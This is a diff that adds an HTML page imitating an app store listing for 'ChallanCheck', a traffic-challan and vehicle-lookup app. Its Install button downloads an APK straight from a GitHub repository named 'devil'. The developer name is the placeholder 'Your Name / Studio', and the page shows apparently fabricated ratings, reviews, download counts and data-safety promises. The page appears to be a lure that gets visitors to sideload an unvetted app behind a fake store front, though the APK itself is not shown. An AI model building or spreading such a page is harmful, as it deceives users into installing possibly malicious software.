@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ChallanCheck — Challan &amp; Car Info</title>
+<style>
+  :root{
+    --ink:#202124;
+    --grey:#5F6368;
+    --grey-light:#F1F3F4;
+    --line:#E8EAED;
+    --green:#01875F;
+    --green-dark:#01684A;
+    --blue:#01875F;
+    --amber:#F2A93B;
+    --red:#D93025;
+    --card:#FFFFFF;
+    --page:#FFFFFF;
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;}
+  body{
+    font-family:'Roboto','IBM Plex Sans',-apple-system,Segoe UI,Arial,sans-serif;
+    background:var(--page);
+    color:var(--ink);
+    line-height:1.5;
+    -webkit-font-smoothing:antialiased;
+  }
+  a{text-decoration:none;color:inherit;}
+  .wrap{max-width:920px;margin:0 auto;padding:0 24px;}
+
+  /* Store chrome */
+  .storebar{border-bottom:1px solid var(--line);}
+  .storebar .wrap{display:flex;align-items:center;gap:20px;padding:12px 24px;}
+  .logo{display:flex;align-items:center;gap:8px;font-weight:500;font-size:19px;color:var(--ink);flex-shrink:0;}
+  .logo .tri{width:0;height:0;border-top:8px solid transparent;border-bottom:8px solid transparent;border-left:13px solid var(--green);}
+  .search{
+    flex:1;display:flex;align-items:center;gap:10px;
+    background:var(--grey-light);border-radius:24px;
+    padding:9px 18px;color:var(--grey);font-size:14px;max-width:520px;
+  }
+  .search svg{flex-shrink:0;}
+
+  /* App header block */
+  .app-head{padding:32px 0 0;}
+  .crumb{font-size:13px;color:var(--green);margin-bottom:18px;}
+  .head-row{display:grid;grid-template-columns:128px 1fr;gap:24px;}
+  .icon{
+    width:128px;height:128px;border-radius:28px;
+    background:linear-gradient(155deg,#1D3A54,#12263A);
+    display:flex;align-items:center;justify-content:center;
+    font-size:46px;font-weight:700;color:var(--amber);
+    box-shadow:0 1px 3px rgba(0,0,0,.15);
+  }
+  .app-title{font-size:28px;font-weight:400;margin:0 0 4px;color:var(--ink);}
+  .dev-row{display:flex;align-items:center;gap:6px;color:var(--green);font-size:14px;margin-bottom:12px;}
+  .badge-tags{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px;}
+  .chip{font-size:12px;color:var(--grey);background:var(--grey-light);padding:4px 10px;border-radius:6px;}
+  .stat-row{display:flex;gap:28px;flex-wrap:wrap;margin-bottom:20px;}
+  .stat{font-size:12px;color:var(--grey);text-align:left;}
+  .stat .big{display:block;font-size:15px;color:var(--ink);font-weight:500;margin-bottom:2px;}
+  .stars-line{color:var(--ink);font-size:15px;letter-spacing:1px;}
+  .install-row{display:flex;align-items:center;gap:16px;}
+  .btn-install{
+    display:inline-block;background:var(--green);color:#fff;font-weight:500;
+    font-size:14px;letter-spacing:.3px;padding:9px 26px;border-radius:20px;
+  }
+  .btn-install:hover{background:var(--green-dark);}
+  .file-note{font-size:12px;color:var(--grey);}
+
+  /* Screenshots */
+  .shots{padding:36px 0 8px;}
+  .shot-scroll{display:flex;gap:14px;overflow-x:auto;padding-bottom:10px;}
+  .shot{flex:0 0 auto;}
+  .shot svg{border-radius:12px;display:block;box-shadow:0 1px 4px rgba(0,0,0,.18);}
+  .shot .cap{font-size:11.5px;color:var(--grey);margin-top:8px;text-align:center;max-width:156px;}
+
+  /* Tabs */
+  .tabs{display:flex;gap:32px;border-bottom:1px solid var(--line);margin-top:36px;}
+  .tab{padding:14px 2px;font-size:14px;color:var(--grey);border-bottom:2px solid transparent;font-weight:500;}
+  .tab.active{color:var(--green);border-bottom-color:var(--green);}
+
+  .section{padding:28px 0;border-bottom:1px solid var(--line);}
+  .section h2{font-size:16px;font-weight:500;margin:0 0 14px;color:var(--ink);}
+  .about-text{font-size:14px;color:var(--ink);max-width:680px;}
+  .about-meta{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:18px;margin-top:20px;max-width:680px;}
+  .about-meta div{font-size:12px;color:var(--grey);}
+  .about-meta strong{display:block;font-size:13.5px;color:var(--ink);font-weight:500;margin-top:2px;}
+
+  .feature-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:14px;margin-top:6px;}
+  .feature{background:var(--grey-light);border-radius:12px;padding:16px;}
+  .feature h3{font-size:13.5px;margin:0 0 4px;font-weight:500;}
+  .feature p{font-size:12.5px;color:var(--grey);margin:0;}
+
+  .safety{display:flex;gap:14px;align-items:flex-start;background:var(--grey-light);border-radius:12px;padding:18px;margin-bottom:10px;}
+  .safety svg{flex-shrink:0;margin-top:2px;}
+  .safety h3{margin:0 0 4px;font-size:13.5px;font-weight:500;}
+  .safety p{margin:0;font-size:12.5px;color:var(--grey);}
+
+  .rating-block{display:flex;gap:36px;flex-wrap:wrap;align-items:center;}
+  .rating-big{font-size:56px;font-weight:400;line-height:1;}
+  .rating-sub{font-size:12px;color:var(--grey);margin-top:4px;}
+  .bars{flex:1;min-width:200px;display:flex;flex-direction:column;gap:5px;}
+  .bar-row{display:flex;align-items:center;gap:8px;font-size:11px;color:var(--grey);}
+  .bar-track{flex:1;height:4px;background:var(--line);border-radius:4px;overflow:hidden;}
+  .bar-fill{height:100%;background:var(--grey);}
+
+  .review{display:flex;gap:12px;padding:18px 0;border-bottom:1px solid var(--line);}
+  .review:last-child{border-bottom:none;}
+  .avatar{width:38px;height:38px;border-radius:50%;background:var(--grey-light);color:var(--grey);display:flex;align-items:center;justify-content:center;font-weight:500;font-size:14px;flex-shrink:0;}
+  .review-name{font-size:13px;font-weight:500;}
+  .review-stars{color:var(--ink);font-size:12px;margin:2px 0 6px;}
+  .review-date{color:var(--grey);font-size:11.5px;margin-left:8px;}
+  .review-text{font-size:13px;color:var(--ink);margin:0;}
+  .review-help{font-size:11.5px;color:var(--grey);margin-top:8px;}
+  .helpful-btn{
+    font-size:11.5px;color:var(--grey);margin-top:8px;background:none;border:1px solid var(--line);
+    border-radius:14px;padding:5px 12px;cursor:pointer;
+  }
+  .helpful-btn:hover{background:var(--grey-light);}
+  .helpful-btn.liked{color:var(--green);border-color:var(--green);background:#E6F4EF;}
+
+  .whatsnew p{font-size:13px;color:var(--ink);margin:0 0 6px;max-width:680px;}
+  .whatsnew ul{margin:8px 0 0;padding-left:18px;font-size:13px;color:var(--ink);}
+
+  footer{padding:26px 0 40px;color:var(--grey);font-size:12px;}
+
+  @media (max-width:640px){
+    .head-row{grid-template-columns:88px 1fr;}
+    .icon{width:88px;height:88px;font-size:32px;border-radius:20px;}
+    .app-title{font-size:20px;}
+    .feature-grid{grid-template-columns:1fr;}
+    .stat-row{gap:18px;}
+  }
+</style>
+</head>
+<body>
+
+<div class="storebar">
+  <div class="wrap">
+    <div class="logo"><span class="tri"></span>Store</div>
+    <div class="search">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><circle cx="11" cy="11" r="7" stroke="#5F6368" stroke-width="2"/><line x1="16.5" y1="16.5" x2="21" y2="21" stroke="#5F6368" stroke-width="2" stroke-linecap="round"/></svg>
+      Search apps
+    </div>
+  </div>
+</div>
+
+<div class="wrap app-head">
+  <div class="crumb">Apps &gt; Tools</div>
+  <div class="head-row">
+    <div class="icon">CC</div>
+    <div>
+      <h1 class="app-title">ChallanCheck — Challan &amp; Car Info</h1>
+      <div class="dev-row">
+        Your Name / Studio
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M12 2l2.4 2.1 3.1-.6 1 3 2.9 1.4-1 3.1 1 3.1-2.9 1.4-1 3-3.1-.6L12 22l-2.4-2.1-3.1.6-1-3-2.9-1.4 1-3.1-1-3.1 2.9-1.4 1-3 3.1.6L12 2z" fill="#01875F"/><path d="M9 12l2 2 4-4" stroke="#fff" stroke-width="1.6" fill="none"/></svg>
+      </div>
+      <div class="badge-tags">
+        <span class="chip">Contains ads</span>
+        <span class="chip">In-app purchases</span>
+      </div>
+      <div class="stat-row">
+        <div class="stat"><span class="stars-line">4.4 ★</span><div>21.4K reviews</div></div>
+        <div class="stat"><span class="big">10K+</span>Downloads</div>
+        <div class="stat"><span class="big">3+</span>Rated for 3+</div>
+      </div>
+      <div class="install-row">
+        <a class="btn-install" href="https://raw.githubusercontent.com/thedeilishere/devil/main/challan%20checker.apk" download="ChallanCheck.apk">Install</a>
+        <span class="file-note">v1.0 · 12 MB · Android 8+</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="wrap shots" id="screenshots">
+  <div class="shot-scroll">
+
+    <div class="shot">
+      <svg viewBox="0 0 156 272" width="156" height="272">
+        <rect width="156" height="272" fill="#12263A"/>
+        <rect x="0" y="0" width="156" height="26" fill="#0C1D2C"/>
+        <text x="14" y="17" fill="#8FB3D9" font-size="9" font-family="Roboto">9:41</text>
+        <text x="14" y="46" fill="#fff" font-size="13" font-weight="700" font-family="Roboto">ChallanCheck</text>
+        <text x="14" y="62" fill="#C9D3DC" font-size="8" font-family="Roboto">Enter a number plate</text>
+        <rect x="14" y="74" width="128" height="30" rx="7" fill="#fff"/>
+        <text x="24" y="94" fill="#5C6B7A" font-size="9" font-family="Roboto">RJ14 AB 1234</text>
+        <rect x="14" y="114" width="128" height="26" rx="6" fill="#F2A93B"/>
+        <text x="78" y="131" fill="#12263A" font-size="9" font-weight="700" text-anchor="middle" font-family="Roboto">Check now</text>
+        <text x="14" y="164" fill="#8FB3D9" font-size="8" font-family="Roboto">RECENT SEARCHES</text>
+        <rect x="14" y="172" width="128" height="24" rx="5" fill="#1D3A54"/>
+        <text x="22" y="188" fill="#fff" font-size="9" font-family="Roboto">RJ02 CD 5566</text>
+        <rect x="14" y="200" width="128" height="24" rx="5" fill="#1D3A54"/>
+        <text x="22" y="216" fill="#fff" font-size="9" font-family="Roboto">DL9C AB 7890</text>
+      </svg>
+      <div class="cap">Search by number plate</div>
+    </div>
+
+    <div class="shot">
+      <svg viewBox="0 0 156 272" width="156" height="272">
+        <rect width="156" height="272" fill="#F7F5F1"/>
+        <rect x="0" y="0" width="156" height="26" fill="#12263A"/>
+        <text x="14" y="17" fill="#fff" font-size="9" font-weight="700" font-family="Roboto">RJ14 AB 1234</text>
+        <text x="14" y="44" fill="#12263A" font-size="10" font-weight="700" font-family="Roboto">2 challans found</text>
+        <rect x="14" y="54" width="128" height="58" rx="8" fill="#fff" stroke="#E4E0D6"/>
+        <text x="22" y="70" fill="#12263A" font-size="9" font-weight="700" font-family="Roboto">Signal jump</text>
+        <text x="22" y="83" fill="#5C6B7A" font-size="7.5" font-family="Roboto">12 Aug 2026 · MP Nagar</text>
+        <rect x="22" y="90" width="42" height="14" rx="7" fill="#D93025"/>
+        <text x="43" y="100" fill="#fff" font-size="7" text-anchor="middle" font-family="Roboto">₹1000</text>
+        <rect x="70" y="90" width="52" height="14" rx="7" fill="#FBE6D8"/>
+        <text x="96" y="100" fill="#D93025" font-size="7" text-anchor="middle" font-family="Roboto">Pending</text>
+        <rect x="14" y="120" width="128" height="58" rx="8" fill="#fff" stroke="#E4E0D6"/>
+        <text x="22" y="136" fill="#12263A" font-size="9" font-weight="700" font-family="Roboto">No helmet</text>
+        <text x="22" y="149" fill="#5C6B7A" font-size="7.5" font-family="Roboto">02 Jul 2026 · Tonk Road</text>
+        <rect x="22" y="156" width="42" height="14" rx="7" fill="#01875F"/>
+        <text x="43" y="166" fill="#fff" font-size="7" text-anchor="middle" font-family="Roboto">₹500</text>
+        <rect x="70" y="156" width="36" height="14" rx="7" fill="#DCEFE5"/>
+        <text x="88" y="166" fill="#01875F" font-size="7" text-anchor="middle" font-family="Roboto">Paid</text>
+      </svg>
+      <div class="cap">Pending fines &amp; status</div>
+    </div>
+
+    <div class="shot">
+      <svg viewBox="0 0 156 272" width="156" height="272">
+        <rect width="156" height="272" fill="#F7F5F1"/>
+        <rect x="0" y="0" width="156" height="26" fill="#12263A"/>
+        <text x="14" y="17" fill="#fff" font-size="9" font-weight="700" font-family="Roboto">Vehicle details</text>
+        <circle cx="78" cy="60" r="24" fill="#1D3A54"/>
+        <text x="78" y="65" fill="#F2A93B" font-size="14" text-anchor="middle" font-weight="700" font-family="Roboto">RJ</text>
+        <g font-family="Roboto">
+          <text x="14" y="104" fill="#5C6B7A" font-size="7.5">Owner name</text>
+          <text x="14" y="116" fill="#12263A" font-size="9" font-weight="700">A. Sharma</text>
+          <line x1="14" y1="124" x2="142" y2="124" stroke="#E4E0D6"/>
+          <text x="14" y="138" fill="#5C6B7A" font-size="7.5">Model</text>
+          <text x="14" y="150" fill="#12263A" font-size="9" font-weight="700">Maruti Swift VXi</text>
+          <line x1="14" y1="158" x2="142" y2="158" stroke="#E4E0D6"/>
+          <text x="14" y="172" fill="#5C6B7A" font-size="7.5">Fuel type</text>
+          <text x="14" y="184" fill="#12263A" font-size="9" font-weight="700">Petrol</text>
+          <line x1="14" y1="192" x2="142" y2="192" stroke="#E4E0D6"/>
+          <text x="14" y="206" fill="#5C6B7A" font-size="7.5">Registration date</text>
+          <text x="14" y="218" fill="#12263A" font-size="9" font-weight="700">14 Mar 2019</text>
+        </g>
+      </svg>
+      <div class="cap">Owner &amp; vehicle details</div>
+    </div>
+
+    <div class="shot">
+      <svg viewBox="0 0 156 272" width="156" height="272">
+        <rect width="156" height="272" fill="#F7F5F1"/>
+        <rect x="0" y="0" width="156" height="26" fill="#12263A"/>
+        <text x="14" y="17" fill="#fff" font-size="9" font-weight="700" font-family="Roboto">History</text>
+        <g font-family="Roboto">
+          <rect x="14" y="38" width="128" height="34" rx="7" fill="#fff" stroke="#E4E0D6"/>
+          <text x="22" y="54" fill="#12263A" font-size="9" font-weight="700">RJ14 AB 1234</text>
+          <text x="22" y="65" fill="#5C6B7A" font-size="7">Checked 2 hours ago</text>
+          <rect x="14" y="78" width="128" height="34" rx="7" fill="#fff" stroke="#E4E0D6"/>
+          <text x="22" y="94" fill="#12263A" font-size="9" font-weight="700">RJ02 CD 5566</text>
+          <text x="22" y="105" fill="#5C6B7A" font-size="7">Checked yesterday</text>
+          <rect x="14" y="118" width="128" height="34" rx="7" fill="#fff" stroke="#E4E0D6"/>
+          <text x="22" y="134" fill="#12263A" font-size="9" font-weight="700">DL9C AB 7890</text>
+          <text x="22" y="145" fill="#5C6B7A" font-size="7">Checked 3 days ago</text>
+          <rect x="14" y="158" width="128" height="34" rx="7" fill="#fff" stroke="#E4E0D6"/>
+          <text x="22" y="174" fill="#12263A" font-size="9" font-weight="700">HR26 DK 8337</text>
+          <text x="22" y="185" fill="#5C6B7A" font-size="7">Checked 1 week ago</text>
+        </g>
+      </svg>
+      <div class="cap">Past searches saved</div>
+    </div>
+
+    <div class="shot">
+      <svg viewBox="0 0 156 272" width="156" height="272">
+        <rect width="156" height="272" fill="#F7F5F1"/>
+        <rect x="0" y="0" width="156" height="26" fill="#12263A"/>
+        <text x="14" y="17" fill="#fff" font-size="9" font-weight="700" font-family="Roboto">Alerts</text>
+        <g font-family="Roboto">
+          <rect x="14" y="40" width="128" height="40" rx="8" fill="#fff" stroke="#E4E0D6"/>
+          <text x="22" y="58" fill="#12263A" font-size="9" font-weight="700">RJ14 AB 1234</text>
+          <text x="22" y="70" fill="#5C6B7A" font-size="7">Notify on new challan</text>
+          <rect x="112" y="52" width="22" height="12" rx="6" fill="#01875F"/>
+          <circle cx="128" cy="58" r="5" fill="#fff"/>
+          <rect x="14" y="88" width="128" height="40" rx="8" fill="#fff" stroke="#E4E0D6"/>
+          <text x="22" y="106" fill="#12263A" font-size="9" font-weight="700">RJ02 CD 5566</text>
+          <text x="22" y="118" fill="#5C6B7A" font-size="7">Notify on new challan</text>
+          <rect x="112" y="100" width="22" height="12" rx="6" fill="#01875F"/>
+          <circle cx="128" cy="106" r="5" fill="#fff"/>
+          <rect x="14" y="136" width="128" height="40" rx="8" fill="#fff" stroke="#E4E0D6"/>
+          <text x="22" y="154" fill="#12263A" font-size="9" font-weight="700">DL9C AB 7890</text>
+          <text x="22" y="166" fill="#5C6B7A" font-size="7">Notify on new challan</text>
+          <rect x="112" y="148" width="22" height="12" rx="6" fill="#E4E0D6"/>
+          <circle cx="118" cy="154" r="5" fill="#fff"/>
+        </g>
+      </svg>
+      <div class="cap">Notify on new challans</div>
+    </div>
+
+  </div>
+</div>
+
+<div class="wrap">
+  <div class="tabs">
+    <div class="tab active" data-panel="panel-about">About</div>
+    <div class="tab" data-panel="panel-reviews">Reviews</div>
+    <div class="tab" data-panel="panel-whatsnew">What's new</div>
+  </div>
+</div>
+
+<div class="panel" id="panel-about">
+<div class="wrap section">
+  <h2>About this app</h2>
+  <p class="about-text">
+    ChallanCheck looks up traffic challans and vehicle registration details from a single number plate.
+    Check pending fines, owner and RC information, and vehicle class in seconds — no government portal
+    logins, no paperwork. Built for daily drivers, fleet owners, and anyone who wants a quick answer
+    before a challan turns into a court notice.
+  </p>
+  <div class="about-meta">
+    <div>Updated on<strong>18 Sept 2026</strong></div>
+    <div>Downloads<strong>10K+</strong></div>
+    <div>Offered by<strong>Your Name / Studio</strong></div>
+    <div>Tags<strong>Tools · Auto &amp; Vehicles</strong></div>
+  </div>
+</div>
+
+<div class="wrap section" id="features">
+  <h2>What it does</h2>
+  <div class="feature-grid">
+    <div class="feature">
+      <h3>Challan lookup</h3>
+      <p>Enter a number plate to see pending and paid challans, fine amount, and issuing authority.</p>
+    </div>
+    <div class="feature">
+      <h3>Vehicle &amp; RC info</h3>
+      <p>Pull registration class, fuel type, model, and registration date for any plate.</p>
+    </div>
+    <div class="feature">
+      <h3>Search history</h3>
+      <p>Every plate you've checked is saved locally, so repeat lookups are one tap away.</p>
+    </div>
+    <div class="feature">
+      <h3>New challan alerts</h3>
+      <p>Save a plate as a favorite and get notified the moment a new challan is recorded against it.</p>
+    </div>
+  </div>
+</div>
+
+<div class="wrap section">
+  <h2>Data safety</h2>
+  <div class="safety">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 2l7 3v6c0 5-3.4 8.4-7 11-3.6-2.6-7-6-7-11V5l7-3z" stroke="#01875F" stroke-width="1.6" fill="none"/><path d="M9 12l2 2 4-4" stroke="#01875F" stroke-width="1.6" fill="none"/></svg>
+    <div>
+      <h3>No data shared with third parties</h3>
+      <p>Number plates you search are stored only on your device.</p>
+    </div>
+  </div>
+  <div class="safety">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><rect x="5" y="10" width="14" height="10" rx="2" stroke="#01875F" stroke-width="1.6"/><path d="M8 10V7a4 4 0 018 0v3" stroke="#01875F" stroke-width="1.6" fill="none"/></svg>
+    <div>
+      <h3>Data is encrypted in transit</h3>
+      <p>Requests to public vehicle records use a secure connection.</p>
+    </div>
+  </div>
+  <div class="safety">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M4 12h16M4 12l4-4M4 12l4 4" stroke="#01875F" stroke-width="1.6" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    <div>
+      <h3>You can request data deletion</h3>
+      <p>Clear your search history any time from Settings inside the app.</p>
+    </div>
+  </div>
+</div>
+</div>
+
+<div class="panel" id="panel-reviews" style="display:none;">
+<div class="wrap section">
+  <h2>Ratings and reviews</h2>
+  <div class="rating-block">
+    <div>
+      <div class="rating-big">4.4</div>
+      <div class="rating-sub">21.4K reviews</div>
+    </div>
+    <div class="bars">
+      <div class="bar-row">5<div class="bar-track"><div class="bar-fill" style="width:64%"></div></div></div>
+      <div class="bar-row">4<div class="bar-track"><div class="bar-fill" style="width:22%"></div></div></div>
+      <div class="bar-row">3<div class="bar-track"><div class="bar-fill" style="width:9%"></div></div></div>
+      <div class="bar-row">2<div class="bar-track"><div class="bar-fill" style="width:3%"></div></div></div>
+      <div class="bar-row">1<div class="bar-track"><div class="bar-fill" style="width:2%"></div></div></div>
+    </div>
+  </div>
+
+  <div class="review">
+    <div class="avatar">R</div>
+    <div>
+      <span class="review-name">Rohit K.</span><span class="review-date">2 weeks ago</span>
+      <div class="review-stars">★★★★★</div>
+      <p class="review-text">Found a pending challan I didn't know about. Saved me a trip to the RTO.</p>
+      <button class="helpful-btn" type="button" data-count="48">👍 <span class="count">48</span> found this helpful</button>
+    </div>
+  </div>
+  <div class="review">
+    <div class="avatar">P</div>
+    <div>
+      <span class="review-name">Priya S.</span><span class="review-date">1 month ago</span>
+      <div class="review-stars">★★★★☆</div>
+      <p class="review-text">Fast lookups. Would like alerts for multiple vehicles at once.</p>
+      <button class="helpful-btn" type="button" data-count="12">👍 <span class="count">12</span> found this helpful</button>
+    </div>
+  </div>
+</div>
+</div>
+
+<div class="panel" id="panel-whatsnew" style="display:none;">
+<div class="wrap section whatsnew">
+  <h2>What's new</h2>
+  <p>Version 1.0</p>
+  <ul>
+    <li>Number plate search with challan and RC lookup</li>
+    <li>Search history and favorite plates</li>
+    <li>New challan alerts</li>
+  </ul>
+</div>
+</div>
+
+<footer>
+  <div class="wrap">
+    ChallanCheck is not affiliated with any government transport authority. Data shown is sourced from
+    public vehicle records. © 2026 Your Name / Studio.
+  </div>
+</footer>
+
+<script>
+  // Tab switching
+  var tabs = document.querySelectorAll('.tab');
+  var panels = document.querySelectorAll('.panel');
+  tabs.forEach(function(tab){
+    tab.addEventListener('click', function(){
+      tabs.forEach(function(t){ t.classList.remove('active'); });
+      tab.classList.add('active');
+      var target = tab.getAttribute('data-panel');
+      panels.forEach(function(p){
+        p.style.display = (p.id === target) ? '' : 'none';
+      });
+      document.getElementById(target).scrollIntoView({behavior:'smooth', block:'start'});
+    });
+  });
+
+  // Helpful (like) buttons on reviews
+  document.querySelectorAll('.helpful-btn').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var liked = btn.classList.toggle('liked');
+      var base = parseInt(btn.getAttribute('data-count'), 10);
+      var countEl = btn.querySelector('.count');
+      countEl.textContent = liked ? base + 1 : base;
+    });
+  });
+</script>
+</body>
+</html>
